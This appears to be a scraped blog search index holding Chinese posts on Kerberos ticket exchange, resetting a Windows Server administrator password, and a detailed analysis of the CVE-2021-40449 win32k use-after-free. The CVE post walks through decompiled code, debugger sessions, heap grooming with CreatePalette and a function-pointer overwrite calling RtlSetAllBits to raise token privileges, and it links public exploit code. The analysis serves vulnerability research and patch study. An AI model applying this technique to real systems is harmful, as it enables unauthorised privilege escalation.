Client向TGS请求服务，发送两条消息 C：消息B和申请的服务ID（明文） D：认证符（包括用户ID、时间戳）通过(Client/TGS Session Key)加密 TGS拿到服务ID检查是否有该服务，如果有该服务则用TGS密钥解密消息B得到(Client/TGS Session Key)再用TGS会话密钥解密消息D得到用户ID、时间戳，与TGT内的用户ID和时间戳比对验证有效性。 通过之后TGS返回两条消息给Client E：ST（SS会话密钥、用户ID、用户网络地址、有效期）通过SS密钥加密 F：SS会话密钥，通过TGS会话密钥加密 Client通过TGS会话密钥解密消息F得到SS会话密钥 Client给SS发送两条消息 G：即消息E H：认证符，包含用户ID，时间戳，通过SS会话密钥加密 SS收到两条消息之后用SS密钥解密消息G（E）得到SS会话密钥，在通过会话密钥解密消息H得到用户ID、时间戳等信息，如果和消息G（E）内的时间戳和用户ID比对，通过则返回消息给Client I：消息H内的时间戳，通过SS会话密钥加密 Client收到消息之后用SS会话密钥解密得到时间戳，并验证，通过则可以向SS发送请求。 "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"在Windows server 2019上重置密码","tags":[],"description":"","content":"重置windows server 2019的administrator密码 之前在Vmware上的Windows server 2019的Administrator密码忘记了，使用网上的方法时找不到用PE启动系统的办法，无奈只能使用其他办法。写此文记录一下。\n设置CD/DVD 首先在虚拟机-设置的硬件选项卡下面的CD/DVD设置为使用ISO映像文件并找到windows server 2019镜像位置，如下图\n之后选择虚拟机-电源-开机时打开固件启动虚拟机，虚拟机就会进入BIOS，在BIOS里选择CD/DVD启动，即会进入下图。\n参考链接\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 分析","tags":[],"description":"","content":"CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。\n基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。\n内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：\n在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。\n句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。\n句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDC：是一个内核对象，全称device context，设备上下文对象\nHDC：DC对象的句柄。\n释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。\neg：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-\u0026gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(\u0026#34;第二次调用\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } 漏洞形成分析 该漏洞产生于win32kfull!GreResetDCInternal函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现任意内核函数调用。\n根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。 ······ 调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\n在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的free步骤。\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······· // 删除HDC句柄对应的DC对象。 bDeleteDCInternal(v6, 1i64, 0i64); 如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到use步骤让内核执行任意内核函数。\n漏洞利用分析 POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOC代码分析：\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\n要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。\n在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局。\n在函数GreResetDCInternal调用DC对象的函数指针之前会调用win32kbase!hdcOpenDCW函数。win32kbase!hdcOpenDCW函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。\n在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。此时达到了free步骤。\n在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 将调用原DC对象内的函数指针，即完成了任意内核函数调用，此时达到了use步骤。\n完整调用链如下图：\n其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDC链表指针 HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; 类之间的关系可以简化为下图：\n调试 free部分 在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。\n调试环境：虚拟机windows 10 1607、物理机windows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\n断点:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;调用GreResetDCInternal函数\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;调用DCOBJ构造函数\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;调用_imp_hdcOpenDCW函数\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;第二次DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;调用DC对象函数指针\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;调用HmgSwapLockedHandle函数\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;调用_imp_bDeleteDCInternal函数\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;循环调用\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;调用win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; 运行POC，断点bp win32kfull!NtGdiResetDC触发此时传入的句柄为rcx=00000000092105f1\n第一次调用win32kfull!GreResetDCInternal 时传入各个参数为rcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 即第一个句柄值为00000000092105f1\n第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，\n根据漏洞形成分析的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：ffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbx存放了构造函数产生的DCO对象地址 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030 // 计算公式 *(dco地址+0x30)=dc地址 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数 // 计算公式 *(dc地址 +0xad0)=函数地址 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // 以下为函数的汇编 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx 之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。\n第二次调用win32kfull!GreResetDCInternal 时，传入同一个HDC句柄，即对应同一个DC对象。\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。\n之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为0000000003210041，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。\n在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。\n调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换\n// 以下内容为旧DC对象，但是句柄为新句柄 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // 以下内容为新DC对象，但句柄为旧句柄 ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... 之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。\n之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。\nfunction pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DC对象的内存已被释放，大小为e30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu 之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// 取DC对象内的函数指针 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use 部分 注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。\n在poc里面会调用CreatePalette函数，该此函数会申请内核堆，\n第一个句柄rcx=0000000015213372\n// 第一个DCO对象 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // 第一个PDC 指向DC对象 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // 第一个DC对象 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 第二个句柄rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放\n0: kd\u0026gt; !pool ffff885e`80063030 // 注意，此时DC对象地址距离堆头地址为0x30大小 Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm 根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPool代码如下，最终是通过调用ExAllocatePoolWithTag申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } 同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。\n通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // 此处为RtlBitMap地址 ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位 ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c 调用DC里面的函数指针之前，自身权限位为正常权限。\n调用函数指针之后，可以看到权限位全部置为了1\n补丁分析 在漏洞利用分析里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。\n我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。\n所以判断DC对象异常可以通过判断DC对象的引用次数实现。\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC ······ 在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); 